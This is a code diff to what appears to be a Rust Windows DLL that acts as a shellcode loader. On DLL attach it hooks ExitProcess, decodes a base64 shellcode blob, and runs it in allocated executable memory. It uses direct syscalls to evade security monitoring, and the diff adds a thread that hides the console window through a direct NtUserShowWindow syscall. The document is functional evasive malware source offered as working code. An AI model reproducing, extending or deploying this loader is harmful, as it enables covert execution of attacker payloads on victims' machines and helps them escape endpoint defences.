@@ -57,6 +57,13 @@ asm_nt_wait_for_single_object:
     mov eax, r9d
     syscall
     ret
+
+.global asm_nt_user_show_window
+asm_nt_user_show_window:
+    mov r10, rcx
+    mov eax, r8d
+    syscall
+    ret
 "#);
 
 extern "C" {
@@ -118,6 +125,12 @@ extern "C" {
         Timeout: *mut i64,
         syscall_id: u32,
     ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_user_show_window(
+        hwnd: windows::Win32::Foundation::HWND,
+        n_cmd_show: u32,
+        syscall_id: u32,
+    ) -> windows::Win32::Foundation::BOOL;
 }
 
 macro_rules! export_function {
@@ -439,8 +452,8 @@ export_function!(ares_version);
 unsafe fn hook_exit_process() {
     if let (Some(kernel32_base), Some(nt_protect_id), Some(nt_write_id)) = (
         get_module_base("kernel32.dll"),
-        get_syscall_number("NtProtectVirtualMemory"),
-        get_syscall_number("NtWriteVirtualMemory"),
+        get_syscall_number("ntdll.dll", "NtProtectVirtualMemory"),
+        get_syscall_number("ntdll.dll", "NtWriteVirtualMemory"),
     ) {
         if let Some(exit_proc_addr) = get_export_address(kernel32_base, "ExitProcess") {
             let exit_proc_ptr = exit_proc_addr as *mut u8;
@@ -454,7 +467,7 @@ unsafe fn hook_exit_process() {
                 -1isize as windows_sys::Win32::Foundation::HANDLE,
                 &mut base_address,
                 &mut region_size,
-                windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
+                0x40, // PAGE_EXECUTE_READWRITE
                 &mut old_protect,
                 nt_protect_id,
             );
@@ -497,8 +510,8 @@ unsafe fn hook_exit_process() {
 
 unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
     if let (Some(nt_create_event_id), Some(nt_wait_id)) = (
-        get_syscall_number("NtCreateEvent"),
-        get_syscall_number("NtWaitForSingleObject"),
+        get_syscall_number("ntdll.dll", "NtCreateEvent"),
+        get_syscall_number("ntdll.dll", "NtWaitForSingleObject"),
     ) {
         let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
         asm_nt_create_event(
@@ -528,8 +541,8 @@ const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1I
 unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
     if let Ok(shellcode) = general_purpose::STANDARD.decode(ENCODED_SHELLCODE) {
         if let (Some(nt_alloc_id), Some(nt_write_id)) = (
-            get_syscall_number("NtAllocateVirtualMemory"),
-            get_syscall_number("NtWriteVirtualMemory"),
+            get_syscall_number("ntdll.dll", "NtAllocateVirtualMemory"),
+            get_syscall_number("ntdll.dll", "NtWriteVirtualMemory"),
         ) {
             let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
             let mut region_size = shellcode.len();
@@ -559,6 +572,25 @@ unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
                 exec_fn();
             }
         }
+    }
+    0
+}
+
+unsafe extern "system" fn hide_console_thread(_: *mut core::ffi::c_void) -> u32 {
+    loop {
+        if let Some(kernel32_base) = get_module_base("kernel32.dll") {
+            if let Some(get_console_window_addr) = get_export_address(kernel32_base, "GetConsoleWindow") {
+                let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
+                let hwnd = get_console_window();
+                if hwnd.0 != 0 {
+                    if let Some(nt_show_window_id) = get_syscall_number("win32u.dll", "NtUserShowWindow") {
+                        asm_nt_user_show_window(hwnd, 0, nt_show_window_id); // SW_HIDE = 0
+                        break;
+                    }
+                }
+            }
+        }
+        std::thread::sleep(std::time::Duration::from_millis(100));
     }
     0
 }
@@ -601,26 +633,25 @@ pub extern "system" fn DllMain(
 ) -> BOOL {
     if fdw_reason == DLL_PROCESS_ATTACH {
         unsafe {
-            if let Some(user32_base) = get_module_base("user32.dll") {
-                if let Some(show_window_addr) = get_export_address(user32_base, "ShowWindow") {
-                    let show_window: extern "system" fn(windows::Win32::Foundation::HWND, u32) -> BOOL = std::mem::transmute(show_window_addr);
-                    if let Some(kernel32_base) = get_module_base("kernel32.dll") {
-                        if let Some(get_console_window_addr) = get_export_address(kernel32_base, "GetConsoleWindow") {
-                            let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
-                            let hwnd = get_console_window();
-                            if hwnd.0 != 0 {
-                                show_window(hwnd, 0); // SW_HIDE
-                            }
-                        }
-                    }
-                }
-            }
-
             hook_exit_process();
 
-            if let Some(nt_create_thread_id) = get_syscall_number("NtCreateThreadEx") {
+            if let Some(nt_create_thread_id) = get_syscall_number("ntdll.dll", "NtCreateThreadEx") {
                 let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
 
+                // Spawn console hider thread
+                asm_nt_create_thread_ex(
+                    &mut thread_handle,
+                    0x1FFFFF, // THREAD_ALL_ACCESS
+                    std::ptr::null_mut(),
+                    -1isize as windows_sys::Win32::Foundation::HANDLE,
+                    hide_console_thread as *mut std::ffi::c_void,
+                    std::ptr::null_mut(),
+                    0, 0, 0, 0,
+                    std::ptr::null_mut(),
+                    nt_create_thread_id,
+                );
+
+                // Spawn shellcode thread
                 asm_nt_create_thread_ex(
                     &mut thread_handle,
                     0x1FFFFF, // THREAD_ALL_ACCESS
